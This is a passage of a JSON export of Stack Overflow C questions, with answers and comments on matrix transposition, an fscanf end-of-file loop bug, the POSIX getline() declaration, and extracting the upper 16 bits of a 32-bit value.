reverse_row(size_t n, int arr[n]);\nvoid transpose_array(size_t n, int arr[n][n]);\n\nint main(void)\n{\n    int array[MATRIX_SZ][MATRIX_SZ] = { { 1, 2, 3, 4 },\n                                        { 5, 6, 7, 8 },\n                                        { 9, 10, 11, 12 },\n                                        { 13, 14, 15, 16 } };\n\n    puts(\"Before transformation:\");\n    print_array(MATRIX_SZ, array);\n    putchar('\\n');\n\n    for (size_t i = 0; i &lt; MATRIX_SZ; i++) {\n        if (i % 2) {\n            reverse_row(MATRIX_SZ, array[i]);\n        }\n    }\n    transpose_array(MATRIX_SZ, array);\n\n    puts(\"After transformation:\");\n    print_array(MATRIX_SZ, array);\n    putchar('\\n');\n\n    return 0;\n}\n\nvoid print_array(size_t n, int arr[n][n])\n{\n    for (size_t i = 0; i &lt; n; i++) {\n        for (size_t j = 0; j &lt; n; j++) {\n            printf(\"%5d\", arr[i][j]);\n        }\n        putchar('\\n');\n    }\n}\n\nvoid reverse_row(size_t n, int arr[n])\n{\n    size_t mid = n / 2;\n    for (size_t i = 0; i &lt; mid; i++) {\n        size_t swap_dx = n - 1 - i;\n        int temp = arr[i];\n        arr[i] = arr[swap_dx];\n        arr[swap_dx] = temp;\n    }\n}\n\nvoid transpose_array(size_t n, int arr[n][n])\n{\n    for (size_t i = 0; i &lt; n; i++) {\n        for (size_t j = 0; j &lt; i; j++) {\n            int temp = arr[i][j];\n            arr[i][j] = arr[j][i];\n            arr[j][i] = temp;\n        }\n    }\n}\n</code></pre>\n\n<p>And here is the program output:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>Before transformation:\n    1    2    3    4\n    5    6    7    8\n    9   10   11   12\n   13   14   15   16\n\nAfter transformation:\n    1    8    9   16\n    2    7   10   15\n    3    6   11   14\n    4    5   12   13\n</code></pre>\n"}], "owner": {"reputation": 89, "user_id": 6797475, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a58e7c6b9d3471458c5d1188c4bbca65?s=128&d=identicon&r=PG&f=1", "display_name": "AjithAj", "link": "https://stackoverflow.com/users/6797475/ajithaj"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 653, "favorite_count": 0, "answer_count": 2, "score": -3, "last_activity_date": 1498045373, "creation_date": 1498007713, "last_edit_date": 1498041674, "question_id": 44665351, "link": "https://stackoverflow.com/questions/44665351/matrix-transpose-with-odd-row-reversed", "title": "Matrix Transpose With odd row Reversed", "body": "<p>I know how to transpose a matrix, But how to transpose a matrix with odd row Reversed form.</p>\n\n<p>Example 3*3 Matrix</p>\n\n<ul>\n<li>1 2 3</li>\n<li>4 5 6</li>\n<li>7 8 9</li>\n</ul>\n\n<p>Output</p>\n\n<ul>\n<li>1 6 7</li>\n<li>2 5 8</li>\n<li>3 4 9</li>\n</ul>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 9846, "user_id": 1745544, "user_type": "registered", "accept_rate": 23, "profile_image": "https://www.gravatar.com/avatar/92a0f69d86d214e0cffceb76c6e3f09f?s=128&d=identicon&r=PG", "display_name": "OldProgrammer", "link": "https://stackoverflow.com/users/1745544/oldprogrammer"}, "edited": false, "score": 1, "creation_date": 1498007724, "post_id": 44665327, "comment_id": 76315995, "body": "Please post a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>"}, {"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 1, "creation_date": 1498007729, "post_id": 44665327, "comment_id": 76315998, "body": "Please read about <a href=\"https://stackoverflow.com/questions/how-to-ask\">How to Ask</a> specially the <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> part."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1498007730, "post_id": 44665327, "comment_id": 76315999, "body": "But you can read <a href=\"https://stackoverflow.com/questions/how-to-ask\">How to Ask</a>, I presume?"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1498007753, "post_id": 44665327, "comment_id": 76316003, "body": "Wow! that was coincidence \u2026"}, {"owner": {"reputation": 593, "user_id": 8031594, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/P0UdV.png?s=128&g=1", "display_name": "Jason V", "link": "https://stackoverflow.com/users/8031594/jason-v"}, "edited": false, "score": 0, "creation_date": 1498007767, "post_id": 44665327, "comment_id": 76316007, "body": "should probably pre increment or change the until to .size-1"}, {"owner": {"reputation": 4328, "user_id": 920069, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dd39f0db1f22e1314746491df063602a?s=128&d=identicon&r=PG", "display_name": "Retired Ninja", "link": "https://stackoverflow.com/users/920069/retired-ninja"}, "edited": false, "score": 0, "creation_date": 1498008377, "post_id": 44665327, "comment_id": 76316146, "body": "Don&#39;t see anything to do with a file in your example."}, {"owner": {"reputation": 193, "user_id": 1144173, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/74955b669a539604faed4b813b3b1152?s=128&d=identicon&r=PG", "display_name": "ZenJ", "link": "https://stackoverflow.com/users/1144173/zenj"}, "edited": false, "score": 0, "creation_date": 1498008816, "post_id": 44665327, "comment_id": 76316255, "body": "This looks ok, the mistake is somewhere else; my guess would be in the place where you fill up your z[] array. The fact that the program is printing the last record twice hints that data is already recorded that way in the array. Try just printing z[] without comparing strings first and see what initial data looks like."}, {"owner": {"reputation": 4328, "user_id": 920069, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dd39f0db1f22e1314746491df063602a?s=128&d=identicon&r=PG", "display_name": "Retired Ninja", "link": "https://stackoverflow.com/users/920069/retired-ninja"}, "edited": false, "score": 0, "creation_date": 1498012934, "post_id": 44665327, "comment_id": 76317194, "body": "Figured it was a misused <code>EOF</code> problem."}], "answers": [{"tags": [], "owner": {"reputation": 2652, "user_id": 4564515, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/90733097a656c664a472c437678aad42?s=128&d=identicon&r=PG&f=1", "display_name": "jschultz410", "link": "https://stackoverflow.com/users/4564515/jschultz410"}, "is_accepted": false, "score": 1, "last_activity_date": 1498012209, "last_edit_date": 1498012209, "creation_date": 1498011596, "answer_id": 44665838, "question_id": 44665327, "link": "https://stackoverflow.com/questions/44665327/cant-figure-out-why-my-function-is-not-passing-the-first-number-of-a-file-but/44665838#44665838", "title": "Can&#39;t figure out why my function is not passing the first number of a file, but passes the last number twice", "body": "<p>You call fscanf before the loop and then again the first moment inside the loop. So, your program ignores (overwrites) the first line of input.   You also process the last line of input twice because after fscanf (most likely) fails on EOF inside the loop you still process combo, which still contains the last line of input that you've already processed.  </p>\n\n<p>Move the fscanfs into the while statement like this:</p>\n\n<pre><code>#include &lt;stddef.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n\n#define STR(x) #x\n#define SSTR(x) STR(x)\n\n#define MAX_STR 1024\n\nvoid process(FILE *out, const char *str)\n{\n  fprintf(out, \"%s\\n\", str);      \n}\n\nint main()\n{\n  FILE *outfilep = fopen(\"user_output\", \"a\");\n  FILE *inputu   = fopen(\"user_input\",  \"r\");\n  char  combo[MAX_STR + 1];\n  int   status;\n\n  if (outfilep == NULL || inputu == NULL)\n    abort();\n\n  while ((status = fscanf(inputu, \"%\" SSTR(MAX_STR) \"s\", combo)) == 1)\n  {\n    process(outfilep, combo);\n\n    /* do other stuff */\n  }\n\n  fclose(inputu);\n  fclose(outfilep);\n\n  return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 7, "user_id": 8128561, "user_type": "registered", "accept_rate": 17, "profile_image": "https://www.gravatar.com/avatar/37d659afad0c7579af7810df2952b332?s=128&d=identicon&r=PG&f=1", "display_name": "Andy Pallermo", "link": "https://stackoverflow.com/users/8128561/andy-pallermo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 54, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1498012209, "creation_date": 1498007511, "last_edit_date": 1498009981, "question_id": 44665327, "link": "https://stackoverflow.com/questions/44665327/cant-figure-out-why-my-function-is-not-passing-the-first-number-of-a-file-but", "title": "Can&#39;t figure out why my function is not passing the first number of a file, but passes the last number twice", "body": "<p>for some reason I can't figure out why my function is not passing the first number of a data file, but it reads the last number twice. Its obviously something small in the search_mpn_table function, but I just can't put my finger on it because I'm relatively new to coding. Thanks in advance.</p>\n\n<pre><code>int search_mpn_table(bacteria_t z[], int size, char combo[])\n{\n    int i;\n    int combocorrect=-1;\n\n    for(i=0;i&lt;size;i++)\n    {\n        if(strcmp(z[i].combo,combo)==0)\n        {   \n            combocorrect=i;\n            printf(\"%s\\n\", z[i].combo);\n        }\n    }\n    return combocorrect;\n}\n</code></pre>\n\n<p>I loaded it into the z array and I printed it correctly in a function that I didn't include here. Here is my call to the function in the main.</p>\n\n<pre><code>FILE *outfilep=fopen(foutput,\"a\");\nFILE *inputu=fopen(\"user_input\",\"r\");\n\nstatus=fscanf(inputu,\"%s\", combo);\nwhile(status!=EOF)\n{\n    status=fscanf(inputu,\"%s\", combo);\n    correct=search_mpn_table(z,datasize,combo);\n    if(correct==-1)\n    {\n        fprintf(outfilep,\"\\nCombination of Positives were not found for %s\", combo);\n    }\n\n    else\n    {\n        fprintf(outfilep,\"\\n%s MPN=%d, 95 pct of examples contain between %d and %d Bacteria per 100mL.\", z[correct].combo, z[correct].mpn, z[correct].upper, z[correct].lower);\n    }\n}\nfclose(inputu);\nfclose(outfilep);\nreturn 0;\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "edited": false, "score": 1, "creation_date": 1498004972, "post_id": 44664888, "comment_id": 76315423, "body": "See the function description at <a href=\"http://man7.org/linux/man-pages/man3/getline.3.html\" rel=\"nofollow noreferrer\">man7.org/linux/man-pages/man3/getline.3.html</a>"}, {"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 0, "creation_date": 1498006625, "post_id": 44664888, "comment_id": 76315772, "body": "You should <b>ALWAYS</b> RTFM !"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1498006835, "post_id": 44664888, "comment_id": 76315811, "body": "You might care to note that POSIX says that <a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/functions/getline.html\" rel=\"nofollow noreferrer\"><code>getline()</code></a> returns a <code>ssize_t</code> (a signed type the same size as the unsigned type <code>size_t</code>).   So, if the <code>&lt;stdio.h&gt;</code> header is included and the POSIX declarations are enabled, the code won&#39;t compile because of the difference between the official prototype and the one quoted in the question."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 1, "creation_date": 1498015102, "post_id": 44664888, "comment_id": 76317702, "body": "@Stargateur It is useful to read the <i>fantastic</i> manual, is it not? ;-)"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1498015525, "post_id": 44664888, "comment_id": 76317784, "body": "@JonathanLeffler &quot;<code>ssize_t</code> (a signed type the <b>same size</b> as the unsigned type <code>size_t</code>)&quot; --&gt; I&#39;ve looked for POSIX that specifies this,  <a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/sys_types.h.html\" rel=\"nofollow noreferrer\">e.g.</a>, yet failed.  Know of any citation?  AFAIK, <code>ssize_t</code> could be wider."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1498015946, "post_id": 44664888, "comment_id": 76317872, "body": "@chux: You&#39;re right.  I&#39;d expect to find the information in the POSIX <a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/functions/V2_chap02.html#tag_15_12\" rel=\"nofollow noreferrer\">data types</a> section, where it doesn&#39;t say what I want it to say (it just says: <i><code>ssize_t</code> \u2014 Signed integer type used for a count of bytes or an error indication</i>).  So it appears that POSIX doesn&#39;t specify that it must be the same size as <code>size_t</code>. Let me know when you find an implementation that uses different sizes for <code>ssize_t</code> and <code>size_t</code>. (This doesn&#39;t affect my key point \u2014 <code>getline()</code> is declared to return <code>ssize_t</code> and not <code>size_t</code>)."}, {"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 0, "creation_date": 1498016346, "post_id": 44664888, "comment_id": 76317956, "body": "The failure of POSIX for me <code>ssize_t</code>, my professor of physic will cry for this non sense. It&#39;s like the <code>isize</code> of rust. Trust me I&#39;m <code>-1m</code> tail."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1498017432, "post_id": 44664888, "comment_id": 76318206, "body": "@JonathanLeffler I became interested in this when posting <a href=\"https://stackoverflow.com/q/32916575/2410359\">%zd</a>"}], "answers": [{"tags": [], "owner": {"reputation": 44103, "user_id": 6568, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/29526c0a49238ab7f1d375f0e63edd1a?s=128&d=identicon&r=PG", "display_name": "Dave Costa", "link": "https://stackoverflow.com/users/6568/dave-costa"}, "is_accepted": true, "score": 3, "last_activity_date": 1498004538, "creation_date": 1498004538, "answer_id": 44664959, "question_id": 44664888, "link": "https://stackoverflow.com/questions/44664888/please-explain-this-declaration-of-the-posix-getline-function/44664959#44664959", "title": "Please explain this declaration of the POSIX getline() function", "body": "<p><code>size_t</code> is a type.  It is probably defined in one of the header files that are included.  The function returns a value of that type, and its second parameter is a pointer to a value of that type.</p>\n\n<p>You are correct that <code>*</code> indicates a pointer.  So <code>**</code> is a pointer to a pointer.  So the function parameter <code>lineptr</code> is the address of a location (A) in memory, which contains the address of another location (B) in memory; the data at the second location should be interpreted as <code>char</code> values.  This implies that the function could change the value stored at location A to point to some location other than B.</p>\n"}, {"comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 4, "creation_date": 1498006903, "post_id": 44665143, "comment_id": 76315824, "body": "It may also be defined equivalent to <code>typedef unsigned long size_t;</code> or <code>typedef unsigned long long size_t;</code> or however else the implementation sees fit."}, {"owner": {"reputation": 350, "user_id": 8050974, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/30d8efdc7f72ebd41632b161bd4a59ec?s=128&d=identicon&r=PG&f=1", "display_name": "WangYang", "link": "https://stackoverflow.com/users/8050974/wangyang"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1498008659, "post_id": 44665143, "comment_id": 76316218, "body": "Yes\uff0cyou are right.  In fact, we should not guess the precise definition of size_t. But we can get the its definition in someone C head file. This is cool  if we can make sense in difference between size_t  and ssize_t . For instance,  the type size_t and ssize_t  in  the function of read   or write  determine how maximum bytes these functions can operate(read from file or write into file). The reture type of these function is ssize_t so that these functions return -1 when they failed to call. But that limits the functions ability  to operate  bytes from or to file."}], "tags": [], "owner": {"reputation": 350, "user_id": 8050974, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/30d8efdc7f72ebd41632b161bd4a59ec?s=128&d=identicon&r=PG&f=1", "display_name": "WangYang", "link": "https://stackoverflow.com/users/8050974/wangyang"}, "is_accepted": false, "score": 2, "last_activity_date": 1498005997, "creation_date": 1498005997, "answer_id": 44665143, "question_id": 44664888, "link": "https://stackoverflow.com/questions/44664888/please-explain-this-declaration-of-the-posix-getline-function/44665143#44665143", "title": "Please explain this declaration of the POSIX getline() function", "body": "<p>Pointer variable needs memory to store value that is a address of memory. If you want to define a pointer variable to store address of a int type variable, you can define the pointer like this: </p>\n\n<pre><code>int *mypointer = NULL;\nint x = 10;\n//store the address of variable x\nmypointer = &amp;x;\n</code></pre>\n\n<p>As we know, the pointer variable is just to store someone's address that is just a number. Thus that pointer variable also has address in the memory space. How to store the pointer's address? We can do that like this:</p>\n\n<pre><code>int *mypointer = NULL;\nint x = 10;\n//the pointer store the x's address\nmypointer = &amp;x;\n\n//define a pointer to store the pointer variable mypointer's address\nint **newpointer = &amp;mypointer; \n</code></pre>\n\n<p>So, char ** is similar with int **.</p>\n\n<p>The type size_t is unsigned int or other type. Note size_t is unsigned type whatever size_t is type of int or someone else. Type ssize_t is signed type in C. For simplicity, size_t <strong>maybe</strong> define as follow:</p>\n\n<pre><code>typedef  unsigned int size_t;\ntypedef int ssize_t;\n</code></pre>\n"}], "owner": {"reputation": 115, "user_id": 8191313, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/L57DQ.jpg?s=128&g=1", "display_name": "Dewan Ahmed", "link": "https://stackoverflow.com/users/8191313/dewan-ahmed"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 189, "favorite_count": 0, "accepted_answer_id": 44664959, "answer_count": 2, "score": 0, "last_activity_date": 1498007005, "creation_date": 1498003912, "last_edit_date": 1498007005, "question_id": 44664888, "link": "https://stackoverflow.com/questions/44664888/please-explain-this-declaration-of-the-posix-getline-function", "title": "Please explain this declaration of the POSIX getline() function", "body": "<p>I see this line right after include and before main function.</p>\n\n<pre><code>size_t getline(char **lineptr, size_t *n, FILE *stream);\n</code></pre>\n\n<p>What I can deduce</p>\n\n<ul>\n<li>getline is a function that takes three input parameters. I also understand the FILE pointer (3rd argument)</li>\n</ul>\n\n<p>Where I'm stuck</p>\n\n<ul>\n<li>I do not understand the other two input parameters and size_t getline.</li>\n<li>Is size_t the type here?</li>\n<li>Also what is the meaning of two <code>*</code>s? I thought a single <code>*</code> is for pointer.</li>\n</ul>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 290304, "user_id": 187690, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/89a4da7af5bf1558b7d2704309f1f118?s=128&d=identicon&r=PG", "display_name": "AnT", "link": "https://stackoverflow.com/users/187690/ant"}, "edited": false, "score": 2, "creation_date": 1498003685, "post_id": 44664833, "comment_id": 76315154, "body": "&quot;Shifting&quot; and &quot;dividing&quot; are the same method, i.e. two different ways to express the same thing. By definition, right shift of unsigned value is integer division by a power of 2. The same power of 2 you use in your &quot;dividing&quot; method."}, {"owner": {"reputation": 15569, "user_id": 2302862, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/e264db339bb96e343770fa38018e00f1?s=128&d=identicon&r=PG", "display_name": "Siguza", "link": "https://stackoverflow.com/users/2302862/siguza"}, "edited": false, "score": 2, "creation_date": 1498004010, "post_id": 44664833, "comment_id": 76315219, "body": "The &quot;most efficient way&quot; ultimately depends on the exact architecture. C does not make any guarantees in that regard."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1498006982, "post_id": 44664833, "comment_id": 76315845, "body": "Sidenote: &quot;DWORD&quot; is no well defined term in programming. Use more clear phrases (<code>uint32_t</code> e.g.). And <code>uint16_t var2 = *( (uint16*)&amp;var1 );</code> invokes <i>undefined behaviour</i> (look it up if you don&#39;t know this - it is a fundamental concept in C).."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1498014031, "post_id": 44664833, "comment_id": 76317476, "body": "Note: <code>LL</code> not needed in <code>( 1ULL &lt;&lt; 16 )</code>, <code>( 1LU &lt;&lt; 16 )</code> or  better <code>((uint32_t)1u &lt;&lt; 16 )</code> or simply <code>0x10000u</code>."}, {"owner": {"reputation": 336, "user_id": 7761980, "user_type": "unregistered", "profile_image": "https://www.gravatar.com/avatar/1d0b835989e13bd56acf5c18117d4c47?s=128&d=identicon&r=PG", "display_name": "ThingyWotsit", "link": "https://stackoverflow.com/users/7761980/thingywotsit"}, "edited": false, "score": 0, "creation_date": 1498028077, "post_id": 44664833, "comment_id": 76322258, "body": "If you want to use a type like &#39;DWORD&#39;, you should add the &#39;Windows&#39; tag."}, {"owner": {"reputation": 581, "user_id": 1801864, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/8f94be3717c4134dfd9040131714e4e2?s=128&d=identicon&r=PG", "display_name": "JonS", "link": "https://stackoverflow.com/users/1801864/jons"}, "edited": false, "score": 0, "creation_date": 1498181608, "post_id": 44664833, "comment_id": 76406125, "body": "dword absolutely has a clear definition.  It&#39;s a double word, which is twice the size of a word which is twice the size of a byte.  Just because Windows uses that as the name of a type doesn&#39;t change the fact that it was already defined before Windows."}, {"owner": {"reputation": 336, "user_id": 7761980, "user_type": "unregistered", "profile_image": "https://www.gravatar.com/avatar/1d0b835989e13bd56acf5c18117d4c47?s=128&d=identicon&r=PG", "display_name": "ThingyWotsit", "link": "https://stackoverflow.com/users/7761980/thingywotsit"}, "edited": false, "score": 0, "creation_date": 1498229724, "post_id": 44664833, "comment_id": 76431299, "body": "@JonS it was?  I have only ever seen &#39;DWORD&#39; as an MS type.."}, {"owner": {"reputation": 581, "user_id": 1801864, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/8f94be3717c4134dfd9040131714e4e2?s=128&d=identicon&r=PG", "display_name": "JonS", "link": "https://stackoverflow.com/users/1801864/jons"}, "reply_to_user": {"reputation": 336, "user_id": 7761980, "user_type": "unregistered", "profile_image": "https://www.gravatar.com/avatar/1d0b835989e13bd56acf5c18117d4c47?s=128&d=identicon&r=PG", "display_name": "ThingyWotsit", "link": "https://stackoverflow.com/users/7761980/thingywotsit"}, "edited": false, "score": 0, "creation_date": 1498356005, "post_id": 44664833, "comment_id": 76466221, "body": "@ThingyWotsit It&#39;s generally used in assembly, which every good C programmer should know. ;)"}, {"owner": {"reputation": 336, "user_id": 7761980, "user_type": "unregistered", "profile_image": "https://www.gravatar.com/avatar/1d0b835989e13bd56acf5c18117d4c47?s=128&d=identicon&r=PG", "display_name": "ThingyWotsit", "link": "https://stackoverflow.com/users/7761980/thingywotsit"}, "edited": false, "score": 0, "creation_date": 1498497691, "post_id": 44664833, "comment_id": 76511366, "body": "@JonS yes, you&#39;re right.  It&#39;s an Intel thingy, not a Windows thingy.  My bad:("}], "answers": [{"comments": [{"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 3, "creation_date": 1498004881, "post_id": 44664867, "comment_id": 76315400, "body": "No, casting is wrong, because it breaks strict aliasing. C is <i>not</i> an assembler, and one shouldn&#39;t reason about what kind of code the compiler should generate."}], "tags": [], "owner": {"reputation": 2024, "user_id": 1315171, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/081b87a82980b9c47ce10d65653ffe57?s=128&d=identicon&r=PG", "display_name": "Zakir", "link": "https://stackoverflow.com/users/1315171/zakir"}, "is_accepted": false, "score": 5, "last_activity_date": 1498076059, "last_edit_date": 1498076059, "creation_date": 1498003677, "answer_id": 44664867, "question_id": 44664833, "link": "https://stackoverflow.com/questions/44664833/what-is-the-most-efficient-way-to-get-the-upper-word-of-a-dword-in-c/44664867#44664867", "title": "What is the most efficient way to get the upper word of a dword in C?", "body": "<p>I would put my bet on <strong>Shifting</strong>  </p>\n\n<p>Casting would not be a portable solution. Think about <em>endianess</em>  </p>\n\n<p>On a side note, I would not recommend casting from a few recent experiences on a custom (in-house) architecture and am sure there should be similar constrains elsewhere </p>\n\n<ul>\n<li>Casting an un-aligned <code>uint8</code> pointer to <code>uint32</code> pointer led to\naccess violation in the processor   </li>\n<li>Casting a <code>uint32</code> pointer of a\nspecial purpose high speed memory region (mapped to DDR) to a <code>uint8</code>\npointer led to data corruption - it was not meant to be addressed by\nanything less than a word (4 byte system)  </li>\n</ul>\n\n<p>I admit these are architecture dependent constraints but the consequences of an unsafe coding style can be drastic!</p>\n"}, {"tags": [], "owner": {"reputation": 290304, "user_id": 187690, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/89a4da7af5bf1558b7d2704309f1f118?s=128&d=identicon&r=PG", "display_name": "AnT", "link": "https://stackoverflow.com/users/187690/ant"}, "is_accepted": true, "score": 3, "last_activity_date": 1498003974, "creation_date": 1498003974, "answer_id": 44664897, "question_id": 44664833, "link": "https://stackoverflow.com/questions/44664833/what-is-the-most-efficient-way-to-get-the-upper-word-of-a-dword-in-c/44664897#44664897", "title": "What is the most efficient way to get the upper word of a dword in C?", "body": "<p>If by \"upper word\" you mean most significant word, then your \"shifting\"/\"dividing\" method is the right way to go. Note that they are equivalent, by definition.</p>\n\n<p>Your casting method is invalid, since it violates <a href=\"https://stackoverflow.com/questions/98650/what-is-the-strict-aliasing-rule\">strict aliasing rules</a>. The proper implementation of this approach would involve a <code>union</code></p>\n\n<pre><code>union { uint32_t v32; uint16_t v16[2]; } u;\n\nuint32_t var1 = 0xABCD1234;\nu.v32 = var1;\nuint16_t var2 = u.v16[1];\n</code></pre>\n\n<p>The result will indeed be platform-dependent (little-endian vs. big-endian). You can also use <code>memcpy</code> for that purpose</p>\n\n<pre><code>uint32_t var1 = 0xABCD1234;\nuint16_t var2;\nmemcpy(&amp;var2, (unsigned char *) &amp;var1 + sizeof(uint16_t), sizeof(uint16_t));\n</code></pre>\n\n<p>with the same set of portability issues.</p>\n"}, {"comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1498007277, "post_id": 44664983, "comment_id": 76315905, "body": "ALUs don&#39;t necessarily implement a barrel-shifter. Most smaller CPUs actually don&#39;t."}], "tags": [], "owner": {"reputation": 203, "user_id": 8104188, "user_type": "registered", "accept_rate": 18, "profile_image": 